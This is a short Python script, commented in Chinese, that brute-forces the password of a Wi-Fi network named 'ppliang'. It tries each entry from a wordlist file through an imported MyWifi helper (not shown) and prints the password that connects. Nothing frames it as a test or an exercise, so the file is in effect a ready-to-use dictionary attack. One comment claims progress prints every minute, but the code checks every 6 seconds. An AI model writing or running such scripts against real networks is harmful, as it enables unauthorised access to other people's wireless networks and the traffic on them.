from MyWifi import MyWifi
import time

wifi = MyWifi()

with open("密码本.txt") as file_object:
    start_time = time.time()  # 记录开始时间
    i = 0
    for line in file_object:
        password = line.rstrip()
        if wifi.check_wifi_connect("ppliang", password):
            print(f"密码是{password}")
            break
        # 每隔一分钟打印一次进度
        current_time = time.time()
        if current_time - start_time >= 6:
            print(f"正在搜索密码... 已经执行{i}条")
            start_time = current_time
        i += 1
